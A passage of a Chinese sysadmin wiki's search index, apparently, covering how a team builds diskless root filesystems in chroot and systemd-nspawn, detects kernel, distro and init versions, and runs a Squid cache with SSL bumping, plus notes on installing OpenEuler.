\u6587\u4ef6\u7cfb\u7edf\uff0c\u63d0\u4f9b\u8fdb\u7a0b\u548c\u5185\u6838\u4fe1\u606f\u8bbf\u95ee\n    mount /proc -t proc /proc\n    # \u521b\u5efa policy-rc.d \u6587\u4ef6\uff0c\u4ee5\u9632\u6b62\u670d\u52a1\u5728\u5b89\u88c5\u65f6\u81ea\u52a8\u542f\u52a8\n    # \u6587\u4ef6\u5185\u5bb9\u8bbe\u7f6e\u4e3a\u7b80\u5355\u7684 shell \u811a\u672c\uff0c\u76f4\u63a5\u9000\u51fa\u5e76\u8fd4\u56de 101 \u72b6\u6001\u7801\n    echo -e '#!/bin/sh\\nexit 101' &gt; /usr/sbin/policy-rc.d\n    chmod +x /usr/sbin/policy-rc.d\n    # \u8bbe\u7f6e apt \u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\n    echo 'Acquire::http::Proxy \"http://ionos14-amd64.debian.net:3128\";' &gt; /etc/apt/apt.conf.d/80proxy\n    # \u914d\u7f6e apt \u8c03\u8bd5\u4fe1\u606f\u8f93\u51fa\uff0c\u7528\u4e8e\u4f9d\u8d56\u89e3\u6790\u548c\u5b89\u88c5\u8fc7\u7a0b\u7684\u8c03\u8bd5\n    cat &gt; /etc/apt/apt.conf.d/80debug &lt;&lt; APTEOF\n    # solution calculation\n    Debug::pkgDepCache::Marker \"true\";\n    Debug::pkgDepCache::AutoInstall \"true\";\n    Debug::pkgProblemResolver \"true\";\n    # installation order\n    Debug::pkgPackageManager \"true\";\n    APTEOF\n    # \u6dfb\u52a0\u6e90\u4ee3\u7801\u4ed3\u5e93\uff0c\u6307\u5b9a\u7248\u672c\u4e3a\u4f20\u5165\u53c2\u6570 $1 \u7684\u53d1\u884c\u7248\u7248\u672c\n    echo \"deb-src $MIRROR $1 main\" &gt; /etc/apt/sources.list.d/$1-src.list\n    apt-get update\n    # \u9884\u914d\u7f6e man-db \u5305\u7684 auto-update \u9009\u9879\u4e3a false\uff0c\u9632\u6b62\u5b89\u88c5\u65f6\u81ea\u52a8\u66f4\u65b0\u624b\u518c\u9875\n    echo \"man-db man-db/auto-update boolean false\" | debconf-set-selections\n    # \u542f\u7528 dpkg \u7684 unsafe-io \u6a21\u5f0f\uff08\u5141\u8bb8\u5e76\u53d1 I/O \u64cd\u4f5c\uff09\uff0c\u63d0\u9ad8\u5b89\u88c5\u901f\u5ea6\n    mkdir -p /etc/dpkg/dpkg.cfg.d\n    echo force-unsafe-io &gt; /etc/dpkg/dpkg.cfg.d/02dpkg-unsafe-io\n    set +x\nEOF\n}\n</code></pre> <p><code>execute_ctmpfile</code> \u7684\u5185\u5bb9\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86\u3002\u6838\u5fc3\u662f\u5176\u4e2d\u7684 <code>sudo chroot</code> \u547d\u4ee4\uff0c\u5c06 <code>$TMPFILE</code> \u811a\u672c\u5728 <code>chroot</code> \u73af\u5883\u4e2d\u6267\u884c\uff1a</p> chroot-installation.sh<pre><code>execute_ctmpfile() {\n    echo \"echo xxxxxSUCCESSxxxxx\" &gt;&gt; $CTMPFILE\n    set -x\n    chmod +x $CTMPFILE\n    set -o pipefail        # see eg http://petereisentraut.blogspot.com/2010/11/pipefail.html\n    (sudo chroot $CHROOT_TARGET $TMPFILE 2&gt;&amp;1 | tee $TMPLOG) || true\n    RESULT=$(grep \"xxxxxSUCCESSxxxxx\" $TMPLOG || true)\n    if [ -z \"$RESULT\" ] ; then\n        RESULT=$(grep -E \"Failed to fetch.*(Unable to connect to|Connection failed|Size mismatch|Cannot initiate the connection to|Bad Gateway|Service Unavailable|Hash Sum mismatch)\" \"$TMPLOG\" || true)\n        if [ -n \"$RESULT\" ] ; then\n            echo\n            echo \"$(date -u) - Warning: Network problem detected.\"\n            echo \"$(date -u) - trying to workaround temporarily failure fetching packages, sleeping 5min before trying again...\"\n            sleep 5m\n            echo\n            sudo chroot $CHROOT_TARGET $TMPFILE\n        else\n            echo \"Failed to run $TMPFILE in $CHROOT_TARGET.\"\n            exit 1\n        fi\n    fi\n    rm $CTMPFILE\n    set +o pipefail\n    set +x\n}\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u81ea\u52a8\u6784\u5efa\u6839\u6587\u4ef6\u7cfb\u7edf","title":"\u81ea\u52a8\u6784\u5efa\u6839\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u6211\u4eec\u4fee\u6539 <code>jenkins.debian.net</code> \u7684\u914d\u7f6e\uff0c\u8fdb\u884c\u7b80\u5316\uff0c\u9002\u914d\u6211\u4eec\u7684\u96c6\u7fa4\u3002</p> <ul> <li><code>common-functions.sh</code> \u548c <code>chroot-installation.sh</code> \u4e24\u4e2a\u6587\u4ef6\u4fdd\u6301\u539f\u6709\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u65b9\u4fbf\u540c\u5b66\u4eec\u6bd4\u8f83\u5b66\u4e60\u3002</li> <li>\u7531\u4e8e Jenkins \u53ef\u4ee5\u4fdd\u8bc1\u6784\u5efa\u8fc7\u7a0b\u4e2d\u811a\u672c\u6587\u4ef6\u4e0d\u88ab\u4fee\u6539\uff0c\u56e0\u6b64\u53bb\u6389 <code>common_init</code> \u4e2d\u7684\u81ea\u62f7\u8d1d\u64cd\u4f5c\u3002</li> <li>\u5c06 <code>chroot-installation.sh</code> \u4e2d\u7684\u529f\u80fd\u6a21\u5757\u62c6\u5206\u5230 <code>modules</code> \u4e0b\u7684\u811a\u672c\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u5199\u5728 <code>chroot-installation.sh</code> \u4e2d\u3002</li> <li>\u6269\u5c55 <code>prepare_bootstrap</code> \u4e3a <code>prepare_module</code>\uff0c\u7528\u4e8e\u52a0\u8f7d\u6a21\u5757\u3002</li> <li><code>execute_ctmpfile</code> \u4ece <code>chroot</code> \u4fee\u6539\u4e3a <code>systemd-nspawn</code>\uff0c\u63d0\u4f9b\u66f4\u597d\u66f4\u65b9\u4fbf\u7684\u865a\u62df\u5316\u548c\u9694\u79bb\u6027\u3002</li> </ul> <p>\u6b64\u5916\u6709\u4e00\u4e9b\u7ea6\u5b9a\uff1a</p> <ul> <li><code>modules-headers.sh</code> \u63d0\u4f9b\u4e86\u5404\u4e2a\u6a21\u5757\u5e38\u7528\u7684\u5de5\u5177\uff1a<ul> <li>\u4f7f\u7528 <code>alias</code>\uff0c\u4e3a <code>apt-get</code>\u3001<code>curl</code>\u3001<code>wget</code> \u7b49\u5e38\u7528\u5de5\u5177\u8bbe\u7f6e\u81ea\u52a8\u786e\u8ba4\u3001\u81ea\u52a8\u91cd\u8bd5\u3001\u6291\u5236\u8f93\u51fa\u7b49\u9009\u9879\u3002</li> <li>\u5305\u88c5\u4e86\u4ece URL \u548c GitHub \u5b89\u88c5\u8f6f\u4ef6\u5305\u7684\u51fd\u6570\u3002</li> <li>\u5e38\u7528\u73af\u5883\u53d8\u91cf\u63d0\u53d6\u3002</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u53d1\u5e03\u547d\u540d\u89c4\u5219","title":"\u53d1\u5e03\u547d\u540d\u89c4\u5219","text":"<p><code>chroot-installation.sh</code> \u7684 <code>cleanup_all()</code> \u8d1f\u8d23\u6784\u5efa\u8fc7\u7a0b\u6700\u540e\u7684\u6587\u4ef6\u79fb\u52a8\u64cd\u4f5c\u3002\u6700\u5f00\u59cb\u6784\u5efa\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\u4f7f\u7528 <code>$RELEASE.$TIMESTAMP</code> \u547d\u540d\u3002\u6839\u636e\u6784\u5efa\u60c5\u51b5\uff0c\u5c06\u88ab\u79fb\u52a8\u5230\uff1a</p> <ul> <li><code>$RELEASE.error</code>\uff1a\u6784\u5efa\u5931\u8d25\uff0c\u7528\u4ee5\u6392\u67e5\u95ee\u9898\u3002</li> <li><code>$RELEASE.latest</code>\uff1a\u6784\u5efa\u6210\u529f\uff0c\u7528\u4e8e\u6d4b\u8bd5\u3002</li> <li><code>$RELEASE</code>\uff1a\u6d4b\u8bd5\u901a\u8fc7\uff0c\u7528\u4e8e\u751f\u4ea7\u3002</li> </ul> <p>\u8fd9\u4e9b\u76ee\u5f55\u90fd\u4f1a\u8986\u76d6\uff0c\u56e0\u6b64\u4e0d\u4f1a\u6709\u5386\u53f2\u6784\u5efa\u7684\u6b8b\u7559\u3002\u4f46\u5982\u679c\u5728 Jenkins \u4e2d Abort \u4efb\u52a1\uff08\u6bd4\u5982\u56e0\u4e3a\u547d\u4ee4\u884c\u4ea4\u4e92\u800c\u963b\u585e\u6784\u5efa\u8fc7\u7a0b\uff09\uff0c\u5219\u4f1a\u6b8b\u7559 <code>$RELEASE.$TIMESTAMP</code> \u76ee\u5f55\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u5185\u6838\u7248\u672c\u53d1\u73b0","title":"\u5185\u6838\u7248\u672c\u53d1\u73b0","text":"<p>\u5728 <code>systemd-nspawn</code> \u73af\u5883\u4e2d\uff0c\u5185\u6838\u4ecd\u7136\u662f\u5bbf\u4e3b\u673a\u7684\u5185\u6838\uff0c\u56e0\u6b64\u65e0\u6cd5\u901a\u8fc7 <code>uname -r</code> \u7b49\u547d\u4ee4\u83b7\u53d6\u5230\u76ee\u6807\u7cfb\u7edf\u5b89\u88c5\u7684\u5185\u6838\u3002\u6211\u4eec\u5c1d\u8bd5\u4e86\u4e00\u4e9b\u65b9\u6848\uff1a</p> <ul> <li> <p>\u67e5\u8be2 <code>/lib/modules</code> \u76ee\u5f55\uff0c\u5176\u4e2d\u53ef\u80fd\u6709\u975e\u5185\u6838\u7248\u672c\u540d\u79f0\u7684\u76ee\u5f55\uff0c\u6bd4\u5982 Ubuntu \u4e2d\u6709 <code>kenrel</code> \u76ee\u5f55\uff0c\u9700\u8981\u8fc7\u6ee4\u3002</p> <pre><code>KERNEL_VERSION=$(ls -1 /lib/modules | sort -V | grep '[0-9]' | tail -n 1)\n</code></pre> <p>\u4f46\u662f\u8fd9\u4e2a\u76ee\u5f55\u53ef\u80fd\u4e0d\u5b58\u5728\u3002</p> </li> <li> <p>\u4f7f\u7528 <code>dpkg</code> \u67e5\u8be2\u5b89\u88c5\u7684\u5185\u6838\u7248\u672c\uff0c\u901a\u5e38\u4e3a <code>linux-image-</code> \u5f00\u5934\u7684\u5305\u3002</p> <pre><code>KERNEL_VERSION=$(dpkg --list | grep linux-image | awk '{print $2}' \\\n    | grep -oP '\\d+\\.\\d+\\.\\d+-\\d+-amd64' | sort -V | tail -n 1)\n</code></pre> <p>\u4f46\u662f <code>linux-image-</code> \u4e5f\u53ef\u80fd\u4e0d\u5b58\u5728\u3002\u6bd4\u5982\u5728 Debian sid \u4e2d\uff0c<code>dracut</code> \u4e0e <code>initramfs-tools</code> \u51b2\u7a81\uff0c\u800c <code>linux-image</code> \u4f9d\u8d56 <code>initramfs-tools</code>\uff0c\u5bfc\u81f4\u88ab\u5378\u8f7d\uff1a</p> <pre><code>Unpacking dracut-core (103-2) ...\ndpkg: initramfs-tools: dependency problems, but removing anyway as you requested:\n linux-image-6.11.7-amd64 depends on initramfs-tools (&gt;= 0.120+deb8u2) | linux-initramfs-tool; however:\n  Package initramfs-tools is to be removed.\n  Package linux-initramfs-tool is not installed.\n  Package initramfs-tools which provides linux-initramfs-tool is to be removed.\n</code></pre> </li> <li> <p>\u76ee\u524d\u6211\u4eec\u91c7\u53d6\u4e86\u4e00\u4e2a\u5e76\u4e0d\u5b8c\u7f8e\u7684\u65b9\u6cd5\u3002\u56e0\u4e3a\u53ea\u6709 <code>dracut</code> \u9700\u8981\u6307\u5b9a\u5185\u6838\u7248\u672c\uff0c\u800c\u5b83\u5b89\u88c5\u65f6\u4f1a\u5728 <code>/boot</code> \u4e0b\u751f\u6210\u643a\u5e26\u5185\u6838\u7248\u672c\u540d\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u5176\u4e2d\u63d0\u53d6\uff1a</p> <pre><code>KERNEL_VERSION=$(for file in /boot/vmlinuz-*; do echo \"${file#/boot/vmlinuz-}\"; done | sort -V | tail -n 1)\n</code></pre> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u53d1\u884c\u7248\u672c\u53d1\u73b0","title":"\u53d1\u884c\u7248\u672c\u53d1\u73b0","text":"<p>\u4f7f\u7528 Systemd \u7ba1\u7406\u7684\u7cfb\u7edf\u90fd\u4f1a\u63d0\u4f9b <code>/etc/os-release</code> \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u7684\u53d1\u884c\u7248\u672c\u4fe1\u606f\u3002\u6211\u4eec\u53ef\u4ee5\u4ece\u4e2d\u63d0\u53d6\uff1a</p> <pre><code>. /etc/os-release\n</code></pre> <p>\u5176\u4e2d\u6700\u5e38\u7528\u7684\u662f <code>ID</code>\uff08\u7cfb\u7edf\u540d\u79f0\uff0c\u5982 <code>debian</code>\u3001<code>ubuntu</code>\uff09\u3001<code>VERSION_CODENAME</code>\uff08\u53d1\u884c\u7248\u672c\u4ee3\u53f7\uff0c\u5982 <code>bullseye</code>\u3001<code>focal</code>\uff09\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cDebian sid \u4e0e testing \u7684 <code>VERSION_CODENAME</code> \u4e00\u81f4\uff0c\u9700\u8981\u501f\u52a9 <code>PRETTY_NAME</code> \u8fdb\u884c\u533a\u5206\u3002</p> <pre><code>case $ID in\ndebian)\n    # sid \u7684 VERSION_CODENAME \u548c testing \u76f8\u540c\uff0c\u9700\u8981\u7279\u6b8a\u5904\u7406\n    if echo \"$PRETTY_NAME\" | grep -q sid; then\n        VERSION_CODENAME=sid\n    fi\n    ;;\nubuntu)\n    ;;\n*)\n    echo \"OS not supported\"\n    exit 1\n    ;;\nesac\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u67b6\u6784\u53d1\u73b0","title":"\u67b6\u6784\u53d1\u73b0","text":"<p><code>dpkg</code> \u63d0\u4f9b\u4e86 <code>dpkg --print-architecture</code> \u547d\u4ee4\uff0c\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u67b6\u6784\u3002</p> <p>\u4e0d\u8fc7\u4f17\u6240\u5468\u77e5\uff0c\u67b6\u6784\u7684\u540d\u79f0\u975e\u5e38\u591a\u6837\uff0c\u6bd4\u5982 <code>amd64</code>\u3001<code>x86_64</code>\u3001<code>x64</code> \u7b49\u3002\u5f88\u591a\u65f6\u5019\u8fd8\u662f\u8981\u81ea\u884c\u5904\u7406\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#init-\u8fdb\u7a0b\u53d1\u73b0","title":"<code>init</code> \u8fdb\u7a0b\u53d1\u73b0","text":"<p>Quote</p> <ul> <li>boot - How to know if I am using systemd on Linux? - Super User</li> </ul> <p>\u6211\u4eec\u9700\u8981\u5224\u65ad <code>init</code> \u8fdb\u7a0b\uff0c\u4ee5\u786e\u5b9a\u67d0\u4e9b\u529f\u80fd\u662f\u5426\u53ef\u7528\uff0c\u6bd4\u5982 <code>systemd</code>\u3002</p> <pre><code>ps --no-headers -o comm 1\n</code></pre> <p>\u4e0e\u666e\u901a\u53d1\u884c\u7248\u8981\u4e48\u662f <code>systemd</code> \u8981\u4e48\u662f <code>init</code> \u4e0d\u540c\uff0c\u5bb9\u5668\u4e2d\u7684\u60c5\u51b5\u6bd4\u8f83\u795e\u5947\uff1a</p> <ul> <li>Docker \u4e2d\u4e3a  <code>tini</code>\uff0c\u4e00\u4e2a\u5999\u5999\u5c0f\u5de5\u5177\u3002</li> <li><code>systemd-nspawn</code><ul> <li>\u4e0d\u5e26\u53c2\u6570\u7684\u4e3a\u9ed8\u8ba4 Shell\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e3a <code>bash</code>\u3002</li> <li>\u5e26\u53ef\u6267\u884c\u6587\u4ef6\u5219\u76f4\u63a5\u4e3a\u6587\u4ef6\u540d\uff0c\u6bd4\u5982\u5e26 <code>/root/test.sh</code> \u5219\u76f4\u63a5\u4e3a <code>test.sh</code>\u3002</li> </ul> </li> <li><code>chroot</code> \u4e0e\u5207\u6362\u524d\u4e00\u81f4\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#squid-\u7f13\u5b58","title":"Squid \u7f13\u5b58","text":"<p>\u7531\u4e8e\u7cfb\u7edf\u6784\u5efa\u9700\u8981\u5927\u91cf\u7684\u7f51\u7edc\u8d44\u6e90\uff0c\u6211\u4eec\u4f7f\u7528 Squid \u4f5c\u4e3a\u7f13\u5b58\u670d\u52a1\u5668\uff0c\u52a0\u901f\u6784\u5efa\u8fc7\u7a0b\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u57fa\u7840\u914d\u7f6e","title":"\u57fa\u7840\u914d\u7f6e","text":"<p>Squid \u81ea\u5e26\u7684\u914d\u7f6e\u6587\u4ef6 <code>squid.conf</code> \u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7684\u6ce8\u91ca\uff0c\u8bf7\u81ea\u884c\u67e5\u9605\u3002\u4e00\u822c\u9ed8\u8ba4\u914d\u7f6e\u5305\u542b\u4e0b\u9762\u7684\u5185\u5bb9\uff1a</p> <pre><code>acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 \"this\" network (LAN)\nacl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)\nacl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)\nacl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines\nacl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)\nacl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)\nacl localnet src fc00::/7               # RFC 4193 local private network range\nacl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines\nacl SSL_ports port 443\nacl Safe_ports port 80          # http\nacl Safe_ports port 21          # ftp\nacl Safe_ports port 443         # https\nacl Safe_ports port 70          # gopher\nacl Safe_ports port 210         # wais\nacl Safe_ports port 1025-65535  # unregistered ports\nacl Safe_ports port 280         # http-mgmt\nacl Safe_ports port 488         # gss-http\nacl Safe_ports port 591         # filemaker\nacl Safe_ports port 777         # multiling http\nhttp_access deny !Safe_ports\nhttp_access deny CONNECT !SSL_ports\nhttp_access allow localhost manager\nhttp_access deny manager\nhttp_access allow localhost\nhttp_access deny to_localhost\nhttp_access deny to_linklocal\ninclude /etc/squid/conf.d/*.conf\nhttp_access deny all\nhttp_port 3128\ncoredump_dir /var/spool/squid\nrefresh_pattern ^ftp:           1440    20%     10080\nrefresh_pattern -i (/cgi-bin/|\\?) 0     0%      0\nrefresh_pattern \\/(Packages|Sources)(|\\.bz2|\\.gz|\\.xz)$ 0 0% 0 refresh-ims\nrefresh_pattern \\/Release(|\\.gpg)$ 0 0% 0 refresh-ims\nrefresh_pattern \\/InRelease$ 0 0% 0 refresh-ims\nrefresh_pattern \\/(Translation-.*)(|\\.bz2|\\.gz|\\.xz)$ 0 0% 0 refresh-ims\nrefresh_pattern .               0       20%     4320\n</code></pre> <ul> <li><code>acl</code> \u6307\u4ee4\u5b9a\u4e49\u4e86\u4e00\u4e9b ACL\u3002</li> <li><code>http_access</code> \u6307\u4ee4\u6839\u636e\u8fd9\u4e9b ACL \u8fdb\u884c\u8bbf\u95ee\u63a7\u5236\uff0c\u5b83\u4eec\u7684\u987a\u5e8f\u5f88\u91cd\u8981\u3002</li> <li><code>http_port</code> \u6307\u4ee4\u5b9a\u4e49\u4e86 Squid \u76d1\u542c\u7684\u7aef\u53e3\u3002</li> <li><code>refresh_pattern</code> \u6307\u4ee4\u5b9a\u4e49\u4e86\u7f13\u5b58\u7684\u5237\u65b0\u7b56\u7565\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u4e2d\u95f4\u4eba\u4ee3\u7406-https","title":"\u4e2d\u95f4\u4eba\u4ee3\u7406 HTTPS","text":"<p>Quote</p> <ul> <li>\u5728 Squid \u670d\u52d9\u4e2d\u914d\u7f6e SSL Bumping\uff1a\u5b9e\u6d4b\u6b63\u786e\u7684\u65b9\u6cd5\uff0c\u6309\u7167\u8fd9\u4e2a\u6587\u6863\u914d\u7f6e\u5373\u53ef\u3002</li> <li>Intercept HTTPS CONNECT messages with SSL-Bump | Squid Web Cache wiki</li> <li>Feature: Squid-in-the-middle SSL Bump | Squid Web Cache wiki</li> </ul> <p>HTTP \u4ee3\u7406\u6280\u672f\u8bf7\u9605\u8bfb \u7f51\u7edc\u8fd0\u7ef4/\u4ee3\u7406\u4e0e\u865a\u62df\u4e13\u7528\u7f51</p> <p>Squid \u4f5c\u4e3a HTTP \u670d\u52a1\u5668\uff0c\u4ece\u539f\u7406\u4e0a\u8bb2\u662f\u65e0\u6cd5\u4ee3\u7406 HTTPS \u6d41\u91cf\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u5176\u65e5\u5fd7\u4e2d\u770b\u5230\u5b83\u5bf9 CONNECT \u65b9\u6cd5\u7684\u5904\u7406\u4e3a <code>TCP_TUNNEL</code> \u800c\u4e0d\u662f\u671f\u671b\u7684 <code>GET</code> \u7b49 HTTP \u65b9\u6cd5\uff1a</p> <pre><code>1736900429.951 181115 172.18.0.1 TCP_TUNNEL/200 654989992 CONNECT registrationcenter-download.intel.com:443 - HIER_DIRECT/23.200.143.19 -\n</code></pre> <p>\u4e3a\u4e86\u4ee3\u7406 HTTPS \u6d41\u91cf\uff0cSquid \u4f7f\u7528\u4e2d\u95f4\u4eba\u65b9\u6cd5\uff1a</p> <ul> <li>\u4ee3\u7406\u670d\u52a1\u5668\uff08Squid\uff09\u62e6\u622a CONNECT \u8bf7\u6c42\uff0c\u4f46\u4e0d\u4f1a\u76f4\u63a5\u5efa\u7acb\u5230\u76ee\u6807\u670d\u52a1\u5668\u7684\u52a0\u5bc6\u901a\u9053\u3002\u76f8\u53cd\uff0c\u5b83\u751f\u6210\u4e00\u4e2a\u4f2a\u9020\u7684\u8bc1\u4e66\uff0c\u58f0\u79f0\u81ea\u5df1\u5c31\u662f\u76ee\u6807\u670d\u52a1\u5668\u3002</li> <li>\u5ba2\u6237\u7aef\u770b\u5230 Squid \u8fd4\u56de\u7684\u4f2a\u9020\u8bc1\u4e66\u540e\uff0c\u4e0e\u4ee3\u7406\u670d\u52a1\u5668\u5efa\u7acb\u4e00\u4e2a\u52a0\u5bc6\u7684 TLS \u4f1a\u8bdd\u3002</li> <li>Squid \u518d\u4e0e\u5b9e\u9645\u76ee\u6807\u670d\u52a1\u5668\u5efa\u7acb\u771f\u5b9e\u7684 TLS \u52a0\u5bc6\u8fde\u63a5\u3002\u8fd9\u4e00\u6b65\u662f\u900f\u660e\u7684\uff0c\u76ee\u6807\u670d\u52a1\u5668\u5e76\u4e0d\u77e5\u9053\u6d41\u91cf\u5df2\u7ecf\u88ab\u62e6\u622a\u3002</li> <li>\u4ee3\u7406\u670d\u52a1\u5668\u89e3\u5bc6\u5ba2\u6237\u7aef\u548c\u76ee\u6807\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u6b64\u65f6\uff0c\u6570\u636e\u662f\u660e\u6587\u7684\u3002</li> <li>\u5728\u89e3\u5bc6\u548c\u5904\u7406\u5b8c\u6210\u540e\uff0c\u4ee3\u7406\u670d\u52a1\u5668\u4f1a\u91cd\u65b0\u52a0\u5bc6\u6570\u636e\uff1a<ul> <li>\u5411\u5ba2\u6237\u7aef\uff1a\u4f7f\u7528\u4f2a\u9020\u8bc1\u4e66\u52a0\u5bc6\u3002</li> <li>\u5411\u76ee\u6807\u670d\u52a1\u5668\uff1a\u4f7f\u7528\u76ee\u6807\u670d\u52a1\u5668\u7684\u771f\u5b9e\u8bc1\u4e66\u52a0\u5bc6\u3002</li> </ul> </li> </ul> <p>Squid \u4e3a\u6bcf\u4e2a\u7f51\u7ad9\u52a8\u6001\u751f\u6210\u8bc1\u4e66\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u5176\u63d0\u4f9b\u7b7e\u53d1\u8fd9\u4e9b\u8bc1\u4e66\u7684 CA\u3002</p> <p><code>ssl-bump</code></p> <p>For each CONNECT request allowed by ssl_bump ACLs, establish secure connection with the client and with the server, decrypt HTTPS messages as they pass through Squid, and treat them as unencrypted HTTP messages, becoming the man-in-the-middle.</p> <p><code>generate-host-certificates[=&lt;on|off&gt;]</code></p> <p>Dynamically create SSL server certificates for the destination hosts of bumped CONNECT requests. When enabled, the cert and key options are used to sign generated certificates. Otherwise generated certificate will be selfsigned.</p> <p>If there is a CA certificate lifetime of the generated certificate equals lifetime of the CA certificate. If generated certificate is selfsigned lifetime is three years. This option is enabled by default when ssl-bump is used. See the ssl-bump option above for more information.</p> <p>\u9664\u4e86\u6309\u7167\u53c2\u8003\u6587\u732e\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6587\u6863\u914d\u7f6e\u5916\uff0c\u6709\u4e00\u4e9b\u53d8\u66f4\uff1a</p> <ul> <li><code>SINGLE_DH_USE</code> \u7b49\u9009\u9879\u5df2\u88ab\u5f03\u7528\uff0c\u53c2\u8003 [squid-users] Transition from squid3.5 to squid4; ciphers don't work anymore, ERROR: Unknown TLS option SINGLE_DH_USE\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/distros/","title":"\u5176\u4ed6\u53d1\u884c\u7248","text":""},{"location":"operation/system/diskless/distros/#\u5176\u4ed6\u53d1\u884c\u7248","title":"\u5176\u4ed6\u53d1\u884c\u7248","text":"<p>Abstract</p> <p>\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684\u53d1\u884c\u7248\u4e3a Debian\uff0c\u4f46\u5728\u4e00\u4e9b\u7279\u6b8a\u573a\u666f\u4e0b\uff0c\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u5176\u4ed6\u53d1\u884c\u7248\u3002\u672c\u6587\u8bb0\u5f55\u4e0d\u540c\u53d1\u884c\u7248\u7684\u5b89\u88c5\u548c\u4f7f\u7528\u7ecf\u9a8c\u3002</p> <p>Tip</p> <p>\u7b14\u8005\u8ba4\u4e3a\uff0c\u5bf9\u4e00\u4e2a\u53d1\u884c\u7248\uff0c\u53ea\u8981\u770b\u5b83\u7684\u5305\u7ba1\u7406\u5668\u548c<code>init</code>\u7cfb\u7edf\u5c31\u591f\u4e86\uff0c\u5176\u4ed6\u4e1c\u897f\u90fd\u662f\u6b21\u8981\u7684\u3002\u6bd4\u5982 OpenEuler,\u5b83\u7684\u5305\u7ba1\u7406\u5668\u4e3a <code>rpm</code>\uff0c<code>init</code> \u7cfb\u7edf\u4e3a <code>systemd</code>\uff0c\u90a3\u4e48\u4f7f\u7528\u4e0a\u5c31\u548c RHEL \u7cfb\u5217\u5dee\u4e0d\u591a\u3002</p> <p>\u5173\u4e8e\u5305\u7ba1\u7406\u5668\uff0cArch Wiki \u4e0a\u6709\u4e00\u7bc7\u5f88\u597d\u7684\u5bf9\u6bd4\u603b\u7ed3\uff1apacman/Rosetta - ArchWiki\u3002</p> <p>Warning</p> <p>\u4ece 2024 \u5e74\u5f00\u59cb\uff0c\u5b66\u6821\u4fe1\u606f\u4e2d\u5fc3\u8981\u6c42\u5404\u5355\u4f4d\u7981\u6b62\u4f7f\u7528 RHEL \u7cfb\u5217\u7684\u53d1\u884c\u7248\uff0c\u5305\u62ec fedora\u3001centos\u3001rocky \u7b49\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e0d\u518d\u5efa\u8bae\u4f7f\u7528\u8fd9\u4e9b\u53d1\u884c\u7248\u3002</p>"},{"location":"operation/system/diskless/distros/#openeuler-\u6b27\u62c9","title":"OpenEuler \u6b27\u62c9","text":""},{"location":"operation/system/diskless/distros/#openeuler-\u5b89\u88c5","title":"OpenEuler \u5b89\u88c5","text":""},{"location":"operation/system/diskless/distros/#\u4f7f\u7528-dnf-\u8fdb\u884c-chroot-\u5b89\u88c5","title":"\u4f7f\u7528 <code>dnf</code> \u8fdb\u884c chroot \u5b89\u88c5","text":"<p>Quote</p> <ul> <li>Root on NFS: Installing system using dnf --installroot - Fedora Discussion</li> <li>Create Fedora rootfs to chroot in with dnf - gist</li> </ul> <p>Error</p> <p>\u5f88\u9057\u61be\uff0cOpenEuler \u73b0\u5728\u4e0d\u5efa\u8bae\u4f7f\u7528 <code>dnf</code> \u8fdb\u884c chroot \u5b89\u88c5\u3002</p> <p>OpenEuler \u81ea\u5df1\u7684 <code>dnf</code> \u4f7f\u7528 ndb\uff0c\u4e0e\u65b0\u7248 <code>dnf</code> \u4f7f\u7528 sqlite \u4e0d\u540c\u3002\u56e0\u6b64\u4f7f\u7528\u65b0\u7248 <code>dnf</code> \u8fdb\u884c chroot \u5b89\u88c5\u540e\uff0cOpenEuler \u7684 <code>dnf</code> \u8bfb\u53d6\u4e0d\u5230\u4efb\u4f55\u5b89\u88c5\u7684\u8f6f\u4ef6\u3002\u9700\u8981\u8fdb\u53bb\u91cd\u65b0\u4f7f\u7528 <code>dnf</code> \u5b89\u88c5\u5404\u7c7b\u8f6f\u4ef6\uff0c\u9020\u6210\u6587\u4ef6\u8986\u5199\uff0c\u5e76\u4e0d\u4f18\u96c5\u3002</p> <p>\u5728 rpm\u540e\u7aef\u6570\u636e\u5e93\u4e3a\u4f55\u9009\u62e9ndb\u800c\u4e0d\u662fsqlite \u00b7 Issue 